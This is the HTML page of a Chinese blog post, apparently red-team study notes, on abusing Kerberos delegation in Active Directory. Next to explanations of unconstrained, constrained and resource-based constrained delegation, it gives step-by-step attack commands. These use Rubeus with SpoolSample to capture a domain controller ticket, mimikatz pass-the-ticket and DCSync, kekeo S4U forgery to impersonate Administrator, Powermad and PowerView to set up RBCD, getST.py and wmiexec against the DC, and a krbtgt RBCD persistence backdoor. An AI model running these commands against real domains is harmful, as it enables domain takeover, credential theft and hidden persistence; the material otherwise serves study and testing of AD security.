@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <meta name="author" content="Dong Yuanxin">
+  
+  
+  <title>约束委派 | hcncn6</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="内网,">
+  
+
+  
+  <meta name="description" content="hcncn小站">
+
+  
+
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>
+  
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":true},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2018-11-1",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "Dong Yuanxin",
+    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">博客0v0</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | 博客重建中，还有其他细节文章</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/hcncn6" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/categories/" target="_self">
+            分类
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2022-09-05
+    </span>
+    
+      <span>
+        | <a href="/categories/内网/"><i class="fa fa-bookmark"></i>内网</a>
+      </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    约束委派
+  </h1>
+  
+  <article class="passage-article">
+    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">委派</span><br><span class="line">	委派: 域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。</span><br><span class="line"></span><br><span class="line">	简言之：当A访问服务B时，服务B拿着A用户的凭证去访问服务C，这个过程称为委派</span><br><span class="line">委派的方式：非约束委派、约束委派和基于资源的约束委派在域内只有主机账号和服务账号才有委派属性。域控制器主机账户默认开启非约束性委派；主机账号：活动目录中的computers组内的计算机，也被称为机器账号(一个普通域用户默认最多可以创建十个主机账号) ；</span><br><span class="line">服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer,MYSQL。域用户账户通过注册SPN也能成为服务账号注意：被委派的用户不能被设置为不能委派属性</span><br><span class="line">	2.2 非约束性委派</span><br><span class="line">当前主机可以模仿某个用户去访问任意服务。需要配置如下：</span><br><span class="line">	如果admin委派服务器B来代替自己访问其他服务，则admin会先将自己的TGT发送给服务器B存储在lsass中。非约束性委派不会走S4U2Self和S4U2proxy这两个协议。</span><br><span class="line">	约束委派就是限制了当前服务器可以被委派去访问哪些服务，非约束性委派是不会限制当前服务器被委派时可访问的服务的。 换句话说，约束性委派被配置后，被委派的主机只能访问之前限制的服务。具体配置如下：</span><br><span class="line"></span><br><span class="line">	若服务器B被配置了约束性委派，则它可以接受任何用户对于某些特定服务的委派例如上图中就是可以接受任何用户对于WIN-JQO4OSM主机上CIFS服务的委派。先经过S4U2SELF阶段拿到一个可转发的TICKET，然后再经过S4U2PROXY阶段，这时候就能代表用户访问特定服务了，这个特定的服务是windows提前定义好的，不像非约束性委派那么自由。配置了约束委派的用户的userAccountControl 属性有个FLAG位 TrustedToAuthForDelegation 。</span><br><span class="line">确定哪些服务可以通过委派访问一般是域管决定的，具体是拥有SeEnableDelegation权限的人决定，这个人一般是域管。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">简介</span><br><span class="line">	(S4U2Self / S4U2proxy), 运⾏服务代表⽤户向 KDC 请求票据。</span><br><span class="line">S4U2self (Service for User to S4U2Self) 可以代表⾃身请求针对其⾃身的 Kerberos 服务票据(ST)；如果⼀个服务账户的 userAccountControl 标志为 TRUSTED_TO_AUTH_FOR_DELEGATION , 则其可以代表任何其他⽤</span><br><span class="line">户获取⾃身服务的 TGS/ST。</span><br><span class="line"></span><br><span class="line">	S4U2proxy (Service for User to Proxy) 可以以⽤户的名义请求其它服务的 ST，限制了 S4U2proxy 扩展的范</span><br><span class="line">围。服务帐户可以代表任何⽤户获取在 msDS-AllowedToDelegateTo 中设置的服务的 TGS/ST，⾸先需要从</span><br><span class="line">该⽤户到其本身的 TGS/ST，但它可以在请求另⼀个 TGS 之前使⽤ S4U2self 获得此 TGS/ST。</span><br><span class="line">不同于允许委派所有服务的⾮约束委派，约束委派的⽬的是在模拟⽤户的同时，限制委派机器/帐户对特定服务的</span><br><span class="line">访问。</span><br><span class="line">	如果我们可以攻破配置约束委派的服务账户(获取密码/Hash)，我们就可以模拟域内任意⽤户(如domain\administrator) 并代表其获得对已配置服务的访问权限（获取 TGS 票据）</span><br><span class="line"></span><br><span class="line">	此外，我们不仅可以访问约束委派配置中⽤户可以模拟的服务，还可以访问使⽤与模拟帐户权限允许的任何服务。（因为未检查 SPN，只检查权限）。⽐如，如果我们能够访问 CIFS 服务，那么同样有权限访问 HOST 服务。注意</span><br><span class="line">如果我们有权限访问到 DC 的 LDAP 服务，则有⾜够的权限去执⾏ DCSync。如果 AD 中将⽤户标记为“帐户敏感且⽆法委派”，则⽆法模拟其身份。</span><br><span class="line"></span><br><span class="line">域委派</span><br><span class="line"></span><br><span class="line">	是指将域内用户的权限委派给服务账号，使得服务账号能以用户权限访问域内的其他服务。域委派是大型网络中经常部署的应用模式，给多跳认证带来了很大的便利，但是与此同时也带来了很大的安全隐患，利用委派，攻击者可获取本地管理员甚至域管理员权限，还可以制作深度隐藏的后门。</span><br><span class="line"></span><br><span class="line">域内委派主要有3种应用方式</span><br><span class="line">	非约束性委派（Unconstrained Delegation）</span><br><span class="line"></span><br><span class="line">	约束性委派（Constrained Delegation）</span><br><span class="line"></span><br><span class="line">	基于资源的约束性委派(RBCD：Resource Based Constrained Delegation</span><br><span class="line">非约束性委派</span><br><span class="line">	（Unconstrained Delegation）</span><br><span class="line">	服务账号可以获取被委派用户的TGT，并将TGT缓存到LSASS进程中，从而服务账号可使用该TGT，模拟该用户访问任意服务。非约束委派的设置需要SeEnableDelegation 特权，该特权通常仅授予域管理员 。</span><br><span class="line"></span><br><span class="line">	• 配置了非约束性委派属性的机器账号的userAccountControl 属性有个Flag位 WORKSTATION_TRUST_ACCOUNT |</span><br><span class="line">TRUSTED_FOR_DELEGATION，其对应的数是0x81000=528384。</span><br><span class="line"></span><br><span class="line">	• 配置了非约束性委派属性的服务账号的userAccountControl 属性有个Flag位 NORMAL_ACCOUNT | TRUSTED_FOR_DELEGATION，</span><br><span class="line">其对应的数是0x80200=524800。</span><br><span class="line">	利用</span><br><span class="line">		Rubeus在本地管理员运行，因为要读取系统记录日志。</span><br><span class="line">SpoolSample在域用户下运行，要不然你无法使用MS-RPRN协议进行通信。</span><br><span class="line"></span><br><span class="line">		我们在本地管理员xd32下使用管理员模式打开cmd，输入我们要监控的域控名称：</span><br><span class="line">		Rubeus.exe monitor /interval:1 /filteruser:DC$</span><br><span class="line"># 我们可以用Rubeus来监听Event ID为4624事件，这样可以第一时间截取到域控的TGT</span><br><span class="line"># /interval:1 设置监听间隔1秒</span><br><span class="line"># /filteruser 监听对象为我们的域控，注意后面有个$，如果不设置监听对象就监听所有的TGT</span><br><span class="line"># DC$为域控的主机名字加$</span><br><span class="line"></span><br><span class="line">		spoolsample.exe DC admin-PC</span><br><span class="line"># 表示利用打印服务强制让域控机向admin-PC主机验证身份，这样我们的Rubeus就可以监听到TGS了</span><br><span class="line"></span><br><span class="line">		此时Rubeus已经接收到了TGT</span><br><span class="line"></span><br><span class="line">		data=&quot;&quot;</span><br><span class="line">for line in open(&apos;1.txt&apos;,&apos;r&apos;):</span><br><span class="line">    data += line.strip(&apos;\n&apos;)</span><br><span class="line">print(data)</span><br><span class="line">with open(&quot;2.txt&quot;,&apos;a&apos;) as f:</span><br><span class="line">    f.write(data)</span><br><span class="line">print(&apos;保存完毕&apos;)</span><br><span class="line"></span><br><span class="line">		[IO.File]::WriteAllBytes(&quot;绝对路径\ticket.kirbi&quot;, [Convert]::FromBase64String(&quot;TGT&quot;))</span><br><span class="line">		使用替换法  空格替换成 空</span><br><span class="line">		mimikatz以域用户身份运行</span><br><span class="line"></span><br><span class="line">		kerberos::ptt ticket.kirbi</span><br><span class="line">lsadump::dcsync /domain:test.lab /all /csv</span><br><span class="line"></span><br><span class="line">	非约束委派+Spooler打印机服务</span><br><span class="line"> 约束性委派</span><br><span class="line">	（Constrained Delegation</span><br><span class="line">	由于非约束性委派的不安全性，微软在Windows Server 2003中发布了约束性委派。同时，为了在Kerberos协议层面对约束性委派的支持，微软扩展了两个子协议 S4u2self(Service for User to Self) 和 S4u2Proxy (Service for User to Proxy )。</span><br><span class="line"></span><br><span class="line">	对于约束性委派（Constrained</span><br><span class="line">Delegation），服务账号只能获取该用户的ST服务票据，从而只能模拟该用户访问特定的服务。配置了约束性委派账户的msDS- Allow edToDelegateTo属性会指定对哪个SPN进行委派。约束委派的设置需要 SeEnableDelegation 特权，该特权通常仅授予域管理员。</span><br><span class="line"></span><br><span class="line">	• 配置了非约束性委派的机器账号的userAccountControl属性有个FLAG位 WORKSTATION_TRUST_ACCOUNT |</span><br><span class="line">TRUETED_TO_AUTHENTICATE_FOR_DELEGATION，其对应的数是0x1001000=16781312。</span><br><span class="line"></span><br><span class="line">	• 配置了非约束性委派的服务账号的userAccountControl属性有个FLAG位 NORMAL_ACCOUNT |</span><br><span class="line">TRUETED_TO_AUTHENTICATE_FOR_DELEGATION，其对应的数是0x1000200=16777728</span><br><span class="line">	查询</span><br><span class="line">		查询域内约束委派（⽤户账户）</span><br><span class="line"></span><br><span class="line">			AdFind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msDS-AllowedToDelegateTo</span><br><span class="line"></span><br><span class="line">		查询域内约束委派(机器账户)</span><br><span class="line"></span><br><span class="line">			AdFind.exe   -b &quot;DC=dd,DC=com&quot;  -f &quot;(&amp;(objectCategory=computer)(objectClass=computer) (userAccountControl:1.2.840.113556.1.4.803:=16777216))&quot; msDS-AllowedToDelegateTo</span><br><span class="line"></span><br><span class="line">		利用</span><br><span class="line">			setspn -A cifs/12server3.redteam.club websec #将websec用户加上spn标识变成服务用户</span><br><span class="line">			使用kekeo请求服务用户的TGT：(这一步需要知晓账户的明文密码或hash)</span><br><span class="line"></span><br><span class="line">			tgt::ask /user:websec /domain:redteam.club /password:pass@123 /ticket:test.kirbi  #使用明文密码请求</span><br><span class="line">tgt::ask /user:websec /domain:redteam.club /NTLM:XXXXX #使用hash请求</span><br><span class="line">			利用这个票据通过伪造S4U请求以administrator身份访问websec的ST：</span><br><span class="line"></span><br><span class="line">			tgs::s4u /tgt:TGT_websec@REDTEAM.CLUB_krbtgt~redteam.club@REDTEAM.CLUB.kirbi /user:Administrator@redteam.club /service:cifs/ad1.redteam.club</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			这时候kekeo当前路径下会出现administrator的ticket (用于访问websec的CIFS服务),将这个凭证导入访问websec的cifs服务:</span><br><span class="line">keberos::ptt 凭证 #导入凭证</span><br><span class="line">基于资源的约束性委派</span><br><span class="line">	(RBCD：Resource Based Constrained Delegation</span><br><span class="line">	为了使用户/资源更加独立，微软在Windows Server 2012中引入了基于资源的约束性委派。基于资源的约束委派不需要域管理员权限去设置，而是把设置属性的权限赋予给了机器自身。基于资源的约束性委派允许资源配置受信任的帐户委派给他们。基于资源的约束性委派只能在运行Windows Server 2012和Windows Server 2012 R2及以上的域控制器上配置，但可以在混合模式林中应用。配置了基于资源的约束性委派账户的</span><br><span class="line"></span><br><span class="line">	msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值为被允许委派账号的SID，并且委派属性这里没有任何值。</span><br><span class="line">	委派的权限授予给了拥有资源的后端，而不再是前端• 约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林</span><br><span class="line">• 不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限，也就是 将计算机加入域的域用户 和 机器自身 拥有权限</span><br><span class="line"></span><br><span class="line">	注意是机器账户，不是普通账户，普通账户没有SPN，因为S4U2self协议会用到SPN，而且通过S4U2Self得到的ST服务票证是**不可被转发**的，而S4U2Proxy的作用就是**将可转发的ST票据转发到其他服务**进行委派认证的。但是：在基于资源的约束委派过程中，不可转发的ST仍可以通过S4U2Proxy转发到其他服务进行委派认证，并且最后还会返回一张可转发的ST服务票证。</span><br><span class="line"></span><br><span class="line">	总的来说：对于约束委派是域管理员去配置约束委派的服务账户，而基于资源的约束委派是机器自身去设置条件来确定被委派控制（在机器自身就可以操作）。更简单来说约束委派是决定去访问哪些主机，基于资源的约束委派是决定哪些主机可以访问我。</span><br><span class="line">	思路</span><br><span class="line">	而机器自身和把机器拉入域的域用户都有权限更改机器的msDS-AllowedToActOnBehalfOfOtherIdentity属性。那我们继续回到一开始的问题“当我们已经获取到一个账号，或者一个机器权限后，如何扩大自己的优势”，因此我们的思路有了：</span><br><span class="line">寻找可控的账号都拉哪些机器入域（查询mS-DS-CreatorSID）</span><br><span class="line">寻找哪些机器的msDS-AllowedToActOnBehalfOfOtherIdentity属性值是可控账号</span><br><span class="line">	条件</span><br><span class="line">		1.机器账户：它是由域用户创建的主机，只要拿下一个域账户，那么就拿下了它创建的所有主机账户</span><br><span class="line">2.知道一个有权修改msDS-AllowedToActOnBehalfOfOtherIdentity的账户和密码（域用户就可以）</span><br><span class="line">3.这个域控是server2012和2012 R2以上</span><br><span class="line">		AdFind.exe -h 192.168.93.10 -u ash -up 123.com -b &quot;DC=test,DC=org&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID //在域主机执行</span><br><span class="line">或者</span><br><span class="line">AdFind.exe -b &quot;DC=dd,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369))&quot; cn mS-DS-CreatorSID</span><br><span class="line">		-b &quot;DC=dd,DC=com&quot; -f &quot;(&amp;(objectsid=S-1-5-21-1075657942-3155756454-206915704-2613))&quot; objectclass cn dn</span><br><span class="line"></span><br><span class="line">		利用 powermad 添加机器账户</span><br><span class="line">下载地址：https://github.com/Kevin-Robertson/Powermad</span><br><span class="line">		Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount ashupup -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br><span class="line">		0</span><br><span class="line">			使用下PowerSploit-dev版本的powerview</span><br><span class="line">Import-Module .\powerview.ps1</span><br><span class="line">Get-DomainComputer -Identity ashupup   //后面是机器账号</span><br><span class="line">			Set-ExecutionPolicy Bypass -Scope Process;import-module .\powerview.ps1;$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-587556175-550635965-2643831430-1110)&quot;;$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer ADMIN--PC| Set-DomainObject -Set @&#123;&apos;msds-allowedtoactonbehalfofotheridentity&apos;=$SDBytes&#125; -Verbose</span><br><span class="line"></span><br><span class="line">		验证一下是否添加成功</span><br><span class="line"></span><br><span class="line">			Get-DomainComputer win7-1 -Properties msds-allowedtoactonbehalfofotheridentity</span><br><span class="line">	基于资源的约束委派利用</span><br><span class="line"></span><br><span class="line">		利用1</span><br><span class="line">			值得注意的是PowerView存在两个版本，有些功能只在dev版本中支持，两个版本的地址分别如下，这里使用带dev的</span><br><span class="line"></span><br><span class="line">    https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</span><br><span class="line">    https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</span><br><span class="line"></span><br><span class="line">			Rubeus.exe hash /user:ashupup /password:123456 /domain:dd.com</span><br><span class="line">			获取rc4_hmac  32ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"></span><br><span class="line">			Rubeus.exe s4u /user:ashupup$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/WIN7-1 /ptt</span><br><span class="line">			方法二getST.py</span><br><span class="line">使用impackets的getST.py</span><br><span class="line">			python getST.py -dc-ip 192.168.93.10 test.org/ashupup\$:123456 -spn cifs/WIN7-1.test.org -impersonate administrator</span><br><span class="line">			再用mimikatz导入就可以</span><br><span class="line"></span><br><span class="line">			kerberos::ptc administrator.ccache</span><br><span class="line">		基于资源的约束委派维持权限</span><br><span class="line"></span><br><span class="line">			import-module .\powerview.ps1$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1528753600-3951244198-520479113-1604)&quot;$SDBytes = New-Object byte[] ($SD.BinaryLength)$SD.GetBinaryForm($SDBytes, 0)Set-DomainObject krbtgt -Set @&#123;&apos;msds-allowedtoactonbehalfofotheridentity&apos;=$SDBytes&#125; -Verbose</span><br><span class="line">			Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount</span><br><span class="line">			getST.py -dc-ip 192.168.93.10 -spn krbtgt -impersonate administrator test.org/ashupup$:123456    //123456是密码</span><br><span class="line">			set KRB5CCNAME=administrator.ccachewmi</span><br><span class="line">			exec.py -no-pass -k administrator@WIN-8GA56TNV3MV.test.org -dc-ip 192.168.93.10</span><br><span class="line">		解决敏感用户不可委派的问题</span><br><span class="line">利用条件：知道目标的主机账户的凭证</span><br><span class="line">注： 一般情况下主机在加入域中会随机设置主机账户的密码，所以一般情况下用的是主机账户hash，并且你是不能修改主机账户的密码，否则该主机就会和域失去信任。</span><br><span class="line">在域环境中，高权限用户如果没有特殊需求的情况下，考虑到安全性一般是设置为不可委派，或者是加入受保护组</span><br><span class="line">下面我们把administrator设置成不可委派以及加入受保护组，如图</span><br><span class="line">总结</span><br><span class="line">	    对于非约束委派攻击，主要是利用的是机器账号，因为在设置非约束委派的机器上面，只要有域内用户登录之后，就会留下凭据放在了该机器的lsass中去，然后导出票据，在导入该机器中里面去，就能读取hash，做权限维持。</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">	对于约束委派，主要就是服务账号，因为在约束委派后加了两个扩展，一个是请求自己，一个是以某用户请求其他的服务。条件就是服务账户开启了约束委派，并且我们已知其密码或者hash值，然后利用kekeo去伪造票据</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">	在面对基于资源的约束委派，跟约束委派还是有着不同的差距，基于资源的约束委派是由域用户加入的主机，来决定哪些主机可以访问我，而约束委派对服务账号设置，来决定访问哪些主机。</span><br><span class="line">    最主要的是windows server 2012和2012R2之后才有了这个功能。</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">	实战利用方式就是用ADFind工具查看哪些机器有mS-DS-CreatorSID的，然后再去创建一个机器账户，找到机器账户的object，把这个创建的机器账户添加到要设置的基于资源的约束委派机器中去，这就是初步的环境搭建。之后就用getST直接申请一个administrator的票据，再用mimikatz的普通权限导入就好了。</span><br><span class="line">    对于敏感用户是因为设置了不可委派的作用，但是可以利用Rebues这个工具先申请一个票据，但是先得用工具对机器账户的读取它的rc然后才能申请，之后因为self可以获取到，但是proxy不行，并且没有服务名，但是这个工具可以添加服务名，添加完服务名之后就可以看到当前账号的票据已经变成administrator了。</span><br></pre></td></tr></table></figure>
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: hcncn</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://hcncn6.github.io/2022/09/05/内网/约束委派/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+</div>
+
+    </main>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+      <div class="site-footer-info">
+        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
+      </div>
+    
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <div class="site-layer-input-choose">
+          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
+        </div>
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div class="bottom-bar-left">
+    <a href="/2022/09/05/内网/mimikatz/" data-enable="true">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/2022/09/05/内网/工具合集/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+  
+  
+  
+  
+</div>
+    
+
+
+
+
+
+    
+  </body>
+</html>
